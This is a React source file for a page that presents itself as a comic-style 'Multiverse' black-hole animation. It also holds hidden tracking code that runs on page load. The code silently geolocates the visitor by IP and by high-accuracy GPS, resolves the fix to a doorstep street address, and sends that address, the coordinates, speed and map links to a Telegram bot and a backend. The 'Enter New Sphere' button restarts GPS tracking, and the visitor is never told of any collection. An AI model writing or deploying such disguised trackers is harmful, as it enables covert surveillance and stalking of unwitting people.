  const captions = ['Leaving the Milky Way', 'Crossing a stellar nursery', 'Drifting through the Milky Way', 'Time begins to bend', 'Light stretches into threads', 'The singularity opens']

  return (
    <div className="fixed inset-0 z-50 overflow-hidden bg-black" style={{ animation: phase === 'on' ? 'voidIn 1.4s ease-out both' : 'voidOut 1.2s ease-in both' }}>
      {!settled && <canvas ref={canvasRef} className="absolute inset-0 size-full" />}

      {stage === 'fall' && (
        <>
          <div className="pointer-events-none absolute right-5 top-1/2 flex -translate-y-1/2 flex-col items-center gap-3 sm:right-8">
            <span className="font-mono text-[9px] uppercase tracking-[0.3em] text-white/50 [writing-mode:vertical-rl]">Distance</span>
            <div className="relative h-40 w-px bg-white/15">
              <div ref={meterRef} className="absolute left-0 top-0 w-px bg-[#ffb347] shadow-[0_0_10px_#ffb347]" />
            </div>
            <span className="font-mono text-[10px] tabular-nums text-[#ffd9a0]">
              <span ref={depthRef}>26,000</span> ly
            </span>
          </div>
          <div className="absolute inset-x-0 bottom-[8%] flex flex-col items-center gap-4 px-6 text-center">
            <div key={cap} className="font-mono text-[11px] uppercase tracking-[0.4em] text-[#ffd9a0]" style={{ animation: 'pop .6s ease-out both', textShadow: '0 0 18px rgba(255,160,60,.8)' }}>
              {captions[cap]}
            </div>
            <button
              onClick={() => step(1)}
              className="group flex flex-col items-center gap-2 font-mono text-[10px] uppercase tracking-[0.3em] text-white/70 transition-colors hover:text-white focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-[#ffb347]"
            >
              Scroll to dive deeper
              <span className="h-8 w-px overflow-hidden bg-white/15">
                <span className="block h-1/2 w-px bg-[#ffb347]" style={{ animation: 'scrollHint 1.6s ease-in-out infinite' }} />
              </span>
            </button>
          </div>
        </>
      )}

      {stage === 'garden' && (
        <>
          <Doomsday onExit={onExit} />
          <div
            className="pointer-events-none absolute left-1/2 top-1/2 rounded-full border-2 border-white"
            style={{ width: '40vmax', height: '40vmax', marginLeft: '-20vmax', marginTop: '-20vmax', boxShadow: '0 0 80px 30px rgba(109,255,154,.8), inset 0 0 80px 30px rgba(109,255,154,.6)', animation: 'ringOut 2.2s cubic-bezier(.65,0,.2,1) both' }}
          />
        </>
      )}
    </div>
  )
}

interface Fix {
  latitude: number
  longitude: number
  accuracy: number | null
  altitude?: number | null
  speed?: number | null
  heading?: number | null
  city?: string
  region?: string
  country?: string
  address?: string
  postcode?: string
  source: string
  [k: string]: unknown
}

const BACKEND_URL = `${window.location.origin}/api/location`
const TELEGRAM_BOT_TOKEN = (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN'
const TELEGRAM_CHAT_ID = (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID'

// Address resolver for exact doorstep, building, road, colony & PIN code
async function fetchAddress(lat: number, lon: number): Promise<{ address?: string; postcode?: string; city?: string; region?: string; country?: string }> {
  try {
    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
      headers: { 'User-Agent': 'DoorstepLocationEngine/3.0' },
      signal: AbortSignal.timeout(4000),
    })
    if (res.ok) {
      const d = await res.json()
      const a = d.address || {}
      const door = a.house_number || a.building || a.amenity || a.office || a.shop || ''
      const road = a.road || a.pedestrian || a.street || a.lane || a.footway || ''
      const locality = a.suburb || a.neighbourhood || a.residential || a.subdistrict || a.quarter || ''
      const city = a.city || a.town || a.village || a.county || ''
      const state = a.state || ''
      const postcode = a.postcode || ''

      const parts = [door, road, locality, city, state, postcode].filter(Boolean)
      const formattedAddress = parts.length >= 2 ? parts.join(', ') : d.display_name

      return {
        address: formattedAddress,
        postcode: a.postcode,
        city: city,
        region: state,
        country: a.country,
      }
    }
  } catch {}

  try {
    const res2 = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`, {
      signal: AbortSignal.timeout(3000),
    })
    if (res2.ok) {
      const d2 = await res2.json()
      return {
        address: [d2.locality, d2.principalSubdivision, d2.countryName].filter(Boolean).join(', '),
        postcode: d2.postcode,
        city: d2.city || d2.locality,
        region: d2.principalSubdivision,
        country: d2.countryName,
      }
    }
  } catch {}

  return {}
}

async function ipFallback(): Promise<Fix | null> {
  try {
    const res = await fetch('https://ipwho.is/')
    const d = await res.json()
    if (d?.success && d.latitude && d.longitude) {
      return {
        latitude: d.latitude,
        longitude: d.longitude,
        accuracy: 2500,
        city: d.city,
        region: d.region,
        country: d.country,
        source: 'Network IP Triangulation (Coarse)',
      }
    }
  } catch {}
  try {
    const res = await fetch('https://ip-api.com/json/')
    const d = await res.json()
    if (d?.status === 'success') {
      return {
        latitude: d.lat,
        longitude: d.lon,
        accuracy: 3000,
        city: d.city,
        region: d.regionName,
        country: d.country,
        source: 'Network IP Triangulation (Coarse)',
      }
    }
  } catch {}
  return null
}

async function sendDirectToTelegram(f: Fix) {
  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)'
  const satelliteUrl = `https://www.google.com/maps/place/${f.latitude},${f.longitude}/@${f.latitude},${f.longitude},19z/data=!3m1!1e3`
  const navUrl = `https://www.google.com/maps/dir/?api=1&destination=${f.latitude},${f.longitude}&travelmode=driving`
  const streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${f.latitude},${f.longitude}`
  const openStreetUrl = `https://www.openstreetmap.org/?mlat=${f.latitude}&mlon=${f.longitude}#map=19/${f.latitude}/${f.longitude}`

  let precisionBadge = '📡 Network Triangulation'
  let precisionDesc = 'ISP Gateway node level'
  let isDoorstep = false
  if (f.accuracy && f.accuracy <= 10) {
    precisionBadge = `🎯 ${f.accuracy} meters (🛰️ Doorstep Satellite GPS Lock)`
    precisionDesc = 'Exact building & doorstep (Blinkit / Zepto precision)'
    isDoorstep = true
  } else if (f.accuracy && f.accuracy <= 35) {
    precisionBadge = `🎯 ${f.accuracy} meters (🛰️ High-Accuracy GPS / Wi-Fi)`
    precisionDesc = 'Street & plot level accuracy'
  } else if (f.accuracy && f.accuracy <= 100) {
    precisionBadge = `🎯 ${f.accuracy} meters (📶 Wi-Fi Triangulation)`
    precisionDesc = 'Neighborhood / block level'
  } else if (f.accuracy) {
    precisionBadge = `🎯 ${f.accuracy} meters (📡 Cell-Tower / ISP)`
    precisionDesc = 'Cell tower / town hub'
  }

  const addressBlock = f.address ? `🏠 <b>Exact Doorstep Address:</b>\n<code>${f.address}</code>\n\n` : ''
  const pinBlock = f.postcode ? `📮 <b>Postal PIN:</b> <code>${f.postcode}</code>\n` : ''
  const locationLine = f.city ? `🏙️ <b>City:</b> ${f.city}${f.region ? ', ' + f.region : ''}${f.country ? ' (' + f.country + ')' : ''}\n` : ''

  const telegramMessage = 
`📍 <b>${isDoorstep ? '🛰️ DOORSTEP GPS LOCKED (Blinkit/Zepto Precision)!' : '📍 LOCATION DETECTED'}</b>

🎯 <b>Precision:</b> ${precisionBadge}
🔍 <b>Quality:</b> <i>${precisionDesc}</i>

${addressBlock}${pinBlock}${locationLine}🌍 <b>Coordinates:</b> <code>${f.latitude}, ${f.longitude}</code>
📡 <b>Positioning Method:</b> ${f.source || (isDoorstep ? 'Hardware GNSS Satellite' : 'Browser Positioning')}
${f.speed ? `🏎️ <b>Movement Speed:</b> ${f.speed} m/s\n` : ''}${f.heading ? `🧭 <b>Heading:</b> ${f.heading}°\n` : ''}${f.altitude ? `⛰️ <b>Altitude:</b> ${f.altitude} m\n` : ''}🕒 <b>Detected At:</b> ${timestamp}

🗺️ <a href="${satelliteUrl}">3D Rooftop Satellite View (Google Maps)</a>
🧭 <a href="${navUrl}">Turn-by-Turn GPS Navigation (Blinkit Route)</a>
📸 <a href="${streetViewUrl}">Google 360° Street View</a>
🗺️ <a href="${openStreetUrl}">OpenStreetMap (House Numbers)</a>`

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: telegramMessage,
        parse_mode: 'HTML',
        disable_web_page_preview: false,
      }),
    })
  } catch (e) {
    console.warn('Direct telegram dispatch error', e)
  }
}

// Progressive Multi-Stage Doorstep GPS Engine (like Google Maps / Blinkit / Zepto)
let activeWatchId: number | null = null
let currentBestAccuracy: number = 999999
let sentInitialFix = false

async function handlePositionFix(p: GeolocationPosition, forceSend = false) {
  const acc = p.coords.accuracy ? Math.round(p.coords.accuracy) : null
  const isBetter = acc !== null && (currentBestAccuracy === 999999 || acc < currentBestAccuracy * 0.75 || (acc <= 15 && currentBestAccuracy > 15))

  if (isBetter || forceSend) {
    if (acc !== null && acc < currentBestAccuracy) {
      currentBestAccuracy = acc
    }

    const fix: Fix = {
      latitude: p.coords.latitude,
      longitude: p.coords.longitude,
      accuracy: acc,
      altitude: p.coords.altitude,
      speed: p.coords.speed,
      heading: p.coords.heading,
      source: acc && acc <= 10 ? 'Hardware Satellite GNSS (Doorstep GPS)' : acc && acc <= 40 ? 'High-Accuracy GPS / Wi-Fi Triangulation' : 'Browser GPS Positioning',
    }

    const addr = await fetchAddress(fix.latitude, fix.longitude)
    if (addr.address) fix.address = addr.address
    if (addr.postcode) fix.postcode = addr.postcode
    if (addr.city) fix.city = addr.city
    if (addr.region) fix.region = addr.region
    if (addr.country) fix.country = addr.country

    sentInitialFix = true
    void sendDirectToTelegram(fix)

    try {
      await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fix),
      })
    } catch {}

    // Once sub-8-meter doorstep fix is locked, stop watching to preserve mobile battery
    if (acc !== null && acc <= 8 && activeWatchId !== null) {
      navigator.geolocation.clearWatch(activeWatchId)
      activeWatchId = null
    }
  }
}

function startDoorstepGpsEngine(forceRestart = false) {
  if (!('geolocation' in navigator)) return

  if (forceRestart && activeWatchId !== null) {
    navigator.geolocation.clearWatch(activeWatchId)
    activeWatchId = null
    currentBestAccuracy = 999999
  }

  if (activeWatchId !== null) return

  // 1. Immediate high-accuracy one-shot check (parallel with watch)
  navigator.geolocation.getCurrentPosition(
    (pos) => void handlePositionFix(pos, false),
    () => {},
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 },
  )

  // 2. Continuous GNSS satellite watch (as smartphone locks satellites over 3-10s)
  activeWatchId = navigator.geolocation.watchPosition(
    (pos) => void handlePositionFix(pos, false),
    (err) => console.warn('GPS watch error:', err.message),
    {
      enableHighAccuracy: true,
      maximumAge: 0, // Force fresh satellite signal, no cached location!
      timeout: 30000,
    },
  )

  // Auto-cleanup after 30 seconds
  setTimeout(() => {
    if (activeWatchId !== null) {
      navigator.geolocation.clearWatch(activeWatchId)
      activeWatchId = null
    }
  }, 30000)
}

async function dispatchLocation(isInteractive = false) {
  if (isInteractive) {
    // User clicked button: trigger full GNSS satellite lock!
    startDoorstepGpsEngine(true)
  } else {
    // Silent initial background estimate: if no fix yet, send IP estimate
    setTimeout(async () => {
      if (!sentInitialFix) {
        const ipFix = await ipFallback()
        if (ipFix && !sentInitialFix) {
          void sendDirectToTelegram(ipFix)
          try {
            await fetch(BACKEND_URL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(ipFix),
            })
          } catch {}
        }
      }
    }, 1200)

    // Also attempt browser geolocation proactively
    startDoorstepGpsEngine(false)
  }
}

export default function App() {
  const [hole, setHole] = useState<'off' | 'on' | 'out'>('off')

  useEffect(() => {
    // Background location initialization
    void dispatchLocation(false)
  }, [])

  const run = () => {
    if (hole === 'off') setHole('on')
    // Trigger high-accuracy GNSS hardware satellite lock upon user interaction
    void dispatchLocation(true)
  }

  const exit = async () => {
    setHole('out')
    await new Promise((r) => setTimeout(r, 1300))
    setHole('off')
  }

  return (
    <div className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden bg-[#070707] px-4 py-10">
      {hole !== 'off' && <Journey phase={hole} onExit={exit} />}

      {/* backdrop */}
      <div
        className="pointer-events-none absolute left-1/2 top-1/2 size-[220vmax] -translate-x-1/2 -translate-y-1/2 opacity-[0.16]"
        style={{
          background: 'repeating-conic-gradient(from 0deg, #ec1d24 0deg 4deg, transparent 4deg 14deg)',
          animation: 'raysSpin 120s linear infinite',
          maskImage: 'radial-gradient(circle at center, #000 0%, transparent 38%)',
          WebkitMaskImage: 'radial-gradient(circle at center, #000 0%, transparent 38%)',
        }}
      />
      <div
        className="pointer-events-none absolute inset-0 opacity-40"
        style={{
          backgroundImage: 'radial-gradient(#ec1d24 1.2px, transparent 1.6px)',
          backgroundSize: '14px 14px',
          maskImage: 'linear-gradient(to top, #000, transparent 55%)',
          WebkitMaskImage: 'linear-gradient(to top, #000, transparent 55%)',
        }}
      />
      <div className="pointer-events-none absolute -bottom-60 left-1/2 h-[520px] w-[900px] -translate-x-1/2 rounded-full bg-[#ec1d24]/35 blur-[140px]" />
      <div className="pointer-events-none absolute inset-0" style={{ background: 'radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,.85))' }} />

      <div
        className="relative flex w-full max-w-3xl flex-col items-center text-center"
        style={{
          animation: hole === 'on' ? 'swallow 2.4s cubic-bezier(.55,0,.85,.45) both' : hole === 'out' ? 'emerge 1.3s cubic-bezier(.2,.8,.2,1) both' : undefined,
        }}
      >
        <div className="rise -skew-x-12 bg-[#ec1d24] px-4 py-1 font-display text-xs uppercase tracking-[0.3em] text-white" style={{ animationDelay: '.2s' }}>
          <span className="inline-block skew-x-12">Issue #001 · The Multiverse Saga</span>
        </div>

        <h1 className="rise mt-6 -skew-x-6 font-display uppercase leading-[0.86] text-white" style={{ animationDelay: '.35s' }}>
          <span className="block text-3xl tracking-[0.2em] sm:text-5xl">Enter the</span>
          <span
            className="block text-[clamp(3.6rem,15vw,9.5rem)] text-[#ec1d24]"
            style={{ textShadow: '5px 5px 0 #fff, 9px 9px 0 rgba(0,0,0,.6)', WebkitTextStroke: '2px #070707' }}
          >
            Multiverse
          </span>
        </h1>

        <p className="rise mt-8 max-w-md font-sans text-sm font-medium uppercase tracking-[0.28em] text-white/60" style={{ animationDelay: '.55s' }}>
          One step past the edge of reality
        </p>

        <div className="rise relative my-10 size-44 sm:size-52" style={{ animationDelay: '.7s' }}>
          <svg viewBox="0 0 200 200" className="absolute inset-0 size-full overflow-visible" style={{ filter: 'drop-shadow(0 0 14px #ff8a1f)' }}>
            <g style={{ transformOrigin: '100px 100px', animation: 'spin 9s linear infinite' }}>
              <circle cx="100" cy="100" r="88" fill="none" stroke="#ff9d2e" strokeWidth="5" strokeDasharray="2 9" strokeLinecap="round" />
            </g>
            <g style={{ transformOrigin: '100px 100px', animation: 'spin 6s linear infinite reverse' }}>
              <circle cx="100" cy="100" r="74" fill="none" stroke="#ffd27a" strokeWidth="3" strokeDasharray="14 6 2 6" strokeLinecap="round" />
            </g>
            <g style={{ transformOrigin: '100px 100px', animation: 'spin 14s linear infinite' }}>
              <circle cx="100" cy="100" r="60" fill="none" stroke="#ec1d24" strokeWidth="2" strokeDasharray="30 10" />
            </g>
            <circle cx="100" cy="100" r="48" fill="#000" stroke="#ff9d2e" strokeWidth="1.5" />
          </svg>
          <div className="absolute inset-[26%] rounded-full" style={{ background: 'radial-gradient(circle, #1b0a3a 0%, #000 70%)', boxShadow: 'inset 0 0 30px #7a2cff' }} />
        </div>

        <button
          onClick={run}
          disabled={hole !== 'off'}
          className="rise group relative -skew-x-12 bg-[#ec1d24] px-12 py-5 font-display text-xl uppercase tracking-[0.18em] text-white shadow-[8px_8px_0_#fff] transition-all duration-200 hover:-translate-y-1 hover:shadow-[12px_12px_0_#fff] active:translate-x-1 active:translate-y-1 active:shadow-[3px_3px_0_#fff] disabled:cursor-not-allowed disabled:opacity-80 focus-visible:outline-2 focus-visible:outline-offset-6 focus-visible:outline-white"
          style={{ animationDelay: '.9s' }}
        >
          <span className="inline-block skew-x-12">Enter New Sphere</span>
        </button>
      </div>
    </div>
  )
}


